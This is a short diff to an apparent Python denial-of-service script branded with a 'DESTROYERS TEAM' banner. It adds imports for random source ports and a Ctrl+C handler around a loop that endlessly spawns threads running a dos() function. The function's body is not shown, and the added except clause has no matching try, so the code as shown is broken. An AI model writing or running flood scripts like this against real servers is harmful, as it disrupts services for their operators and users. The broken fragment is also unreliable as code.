@@ -1,5 +1,7 @@
 import threading
 import requests
+import random	# For Random source port
+import time
 
 print("🅳🅴🆂🆃🆁🅾🆈🅴🆁🆂 🆃🅴🅰🅼")
 
@@ -12,3 +14,6 @@ def dos():
   
 while True:
  threading.Thread(target=dos).start()
+    
+except KeyboardInterrupt:
+	print("Script Stopped [ctrl + c]... Shutting down")
